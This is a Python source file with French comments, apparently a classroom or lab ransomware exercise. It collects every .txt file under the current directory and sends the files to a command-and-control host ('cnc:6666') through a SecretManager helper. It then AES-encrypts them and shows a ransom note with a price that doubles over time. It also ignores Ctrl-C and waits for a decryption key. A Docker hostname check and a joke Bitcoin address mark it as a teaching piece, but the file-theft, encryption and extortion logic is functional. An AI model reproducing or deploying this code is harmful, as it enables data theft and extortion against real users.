import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager
import signal
import os
import multiprocessing,time

CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

AMOGUS = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⠛⠛⠛⠛⠻⢿⣿⣷⣤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠈⢻⣿⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⣿⡏⠀⠀⠀⣠⣶⣾⣿⣿⠿⠿⠿⢿⣿⣿⣿⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁⠀⠀⢰⣿⣿⣯⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄⠀
⠀⠀⣀⣤⣴⣶⣶⣿⡟⠀⠀⠀⢸⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⠀
⠀⢰⣿⡟⠋⠉⣹⣿⡇⠀⠀⠀⠘⣿⣿⣿⣿⣷⣦⣤⣤⣤⣶⣶⣶⣶⣿⣿⠀
⠀⢸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀
⠀⣸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠉⠻⠿⣿⣿⣿⣿⡿⠿⠿⠛⢻⣿⡇⠀⠀
⠀⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀
⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀
⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀
⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⢠⣿⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿   ⠀⢸⣿⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿ ⠀⠈⠻⣿⣿⣿⣿⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
ENCRYPT_MESSAGE_TEMPLATE  = """\rYour txt files have been locked. Send an email to rick.asley@hewillnotgiveyouup.net with title '{token}' to unlock your data and send {price} BTC to the following address: {address}
The price will be multiplied by 2 every 24 hours.
"""

DECRYPT_MESSAGE  = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢀⣔⣷⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣿⡝⠉⠉⠽⣿⣃⣼⣷⠶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠫⢿⣄⠀⠀⠈⣿⠁⠀⠀⣁⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢛⣷⢂⠀⠀⠀⣀⡷⢣⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⣿⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⣿⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢚⣾⠀⠀⠀⣽⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⣿⠀⠀⠀⣿⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣸⣿⡏⠉⣙⣿⣿⣷⣶⣖⣷⣶⣿⣿⡲⣶⣲⣿⢗⣶⣖⣶⣲⣾⣛⠀⠀⠀
⠀⣿⣿⠁⠀⠉⣿⣿⡟⠛⠟⠝⠏⢙⠉⠙⠉⠋⠍⠙⠙⠉⠛⠛⣿⣿⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀
⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀
⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀⠀
⠀⠀⠛⢿⣿⣿⣿⣿ ⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿  ⠀⠀⢸⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿ ⠀⠈⠻⣿⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
Your txt files have been unlocked.
"""

class Ransomware:
    DOUBLE_TIME = 30  # Tout les 30 secondes, le prix sera multiplié par 2
    MAX_PRICE = 4096  # Prix maximum en BTC
    BITCOIN_ADDRESS = "https://www.youtube.com/watch?v=v1PBptSDIh8"  # Je n'ai pas d'adresse Bitcoin, donc je mets une vidéo YouTube
    REFRESH_DELAY = 30 # rafraichissement de l'affichage du prix en secondes
    def __init__(self) -> None:
        # Vérifier si on est dans un conteneur Docker
        self.check_hostname_is_docker()
        self.hex_token = None  # Token en hexadécimal
        self.timestamp = None  # Timestamp en secondes

    def check_hostname_is_docker(self) -> None:
        # Vérifier si on est dans un conteneur Docker pour éviter d'exécuter ce programme en dehors d'un conteneur
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter: str) -> list:
        # Récupérer tous les fichiers correspondant au filtre, en excluant les liens symboliques
        base_path = Path(".")
        matching_files = [str(file.absolute()) for file in base_path.rglob(filter) if not file.is_symlink()]
        return matching_files

    def encrypt(self):
        try:
            # Obtenir la liste des fichiers à chiffrer
            files_to_encrypt = self.get_files("*.txt")
            
            # Créer le gestionnaire de secrets
            secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
            
            # Configurer le gestionnaire de secrets
            secret_manager.setup()
            
            # Envoyer les fichiers à l'attaquant
            secret_manager.leak_files(files_to_encrypt)
            
            # Chiffrer les fichiers
            secret_manager.aes_files(files_to_encrypt)
        except Exception as e:
            print(f"Error: {e}")


    def countdown(self):
        # Nettoyer la console
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Afficher le message initial
        print(AMOGUS.format())

        while True:
            # Calculer le prix en fonction du temps écoulé
            price = 2 ** (int(time.time() - self.timestamp) // self.DOUBLE_TIME)
            if price > self.MAX_PRICE:
                price = self.MAX_PRICE

            # Afficher le message de chiffrement avec le prix et l'adresse Bitcoin
            print(ENCRYPT_MESSAGE_TEMPLATE.format(token=self.hex_token, price=price, address=self.BITCOIN_ADDRESS))

            # Afficher la demande de clé de déchiffrement
            print("\nEnter the decryption key: ", end=" ")
            sys.stdout.flush()

            # Attendre 30 secondes, dans le cas ou on met un 
            time.sleep(self.REFRESH_DELAY)

            # Revenir en arrière pour réécrire le message à la prochaine itération
            sys.stdout.write("\033[6A")
            sys.stdout.flush()


    def decrypt(self):
        # Charger les éléments cryptographiques et la liste des fichiers chiffrés
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        secret_manager.load()

        self.hex_token = secret_manager.get_hex_token()
        self.timestamp = secret_manager.get_int_timestamp()

        encrypted_files = self.get_files("*.txt")

        # Démarrer le processus de compte à rebours
        process_countdown = multiprocessing.Process(target=self.countdown)
        process_countdown.start()

        while True:
            try:
                # Demander la clé de déchiffrement
                b64_key = input("")
                # Définir la clé
                secret_manager.set_key(b64_key)
                # Déchiffrer les fichiers
                secret_manager.unaes_files(encrypted_files)
                # Nettoyer les éléments cryptographiques locaux
                secret_manager.clean()

                # Nettoyer la console
                os.system('cls' if os.name == 'nt' else 'clear')
        
                # Afficher un message pour informer l'utilisateur que tout s'est bien passé
                print(DECRYPT_MESSAGE)

                # Arrêter le processus de compte à rebours
                process_countdown.terminate()

                # Quitter le ransomware
                break
            except ValueError as e:
                # Afficher un message d'erreur si la clé n'est pas valide
                print("\nPlease provide a valid decryption key.", end="")
                sys.stdout.write("\033[2A")
                sys.stdout.flush()

                sys.stdout.write("\033[2K")
                sys.stdout.flush()

                # Réimprimer le message pour demander la clé de déchiffrement
                print("\rEnter the decryption key:", end="")
            except Exception as e:
                # Afficher un message d'erreur en cas d'erreur inattendue
                print("\nUnexpected error occurred during decryption")
                break


if __name__ == "__main__":
    # Ignorer les interruptions SIGINT
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    # Configurer la journalisation
    logging.basicConfig(level=logging.DEBUG)
    # Vérifier les arguments de la ligne de commande
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
        ransomware.decrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()
